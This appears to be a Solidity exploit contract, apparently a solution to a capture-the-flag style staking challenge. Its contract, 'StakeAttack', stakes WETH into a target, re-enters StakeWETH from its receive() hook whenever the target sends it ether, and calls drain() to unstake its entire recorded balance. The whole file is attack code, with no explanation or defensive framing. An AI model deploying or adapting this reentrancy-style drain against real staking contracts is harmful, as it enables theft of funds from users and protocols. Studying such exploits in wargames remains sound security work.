pragma solidity ^0.8.0;
interface IStake {
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function UserStake(address account) external view returns (uint256);
}

contract StakeAttack {
    IStake public immutable instance;

    constructor(address _instance) {
        instance = IStake(_instance);
    }

    function attack() external {
        instance.StakeWETH(0.002 ether);
    }

    receive() external payable {
        if (address(instance) == msg.sender) {
            instance.StakeWETH(0.002 ether);
        }
    }

    function drain() external {
        instance.Unstake(instance.UserStake(address(this)));
    }
}